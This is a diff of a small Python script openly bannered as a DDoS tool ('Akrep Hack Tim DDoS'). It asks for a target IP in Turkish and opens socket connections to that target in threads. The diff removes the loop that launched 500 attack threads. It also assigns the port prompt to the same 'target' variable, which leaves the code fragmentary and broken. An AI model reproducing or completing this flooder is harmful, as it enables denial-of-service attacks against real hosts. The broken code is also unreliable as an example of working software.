@@ -1,18 +1,16 @@
 import socket
 import threading
 import os
-
 os.system("clear")
 banner="""
 ###############################
-#Akrep Hack Tim DDoS           #
+#Akrep Hack Tim DDoS          #
 #Code By Bunny Sayne          #
 ###############################
 """
 print (banner)
-
-target = input("hedef ip:")
-port = 80
+target = input("hedef ip: ")
+target = input("hedef port: ")
 
 attack_num = 0
 def attack():
@@ -27,7 +25,3 @@ def attack():
         print(attack_num)
 
         s.close()
-
-for i in range(500):
-    thread = threading.Thread(target= attack)
-    thread.start()
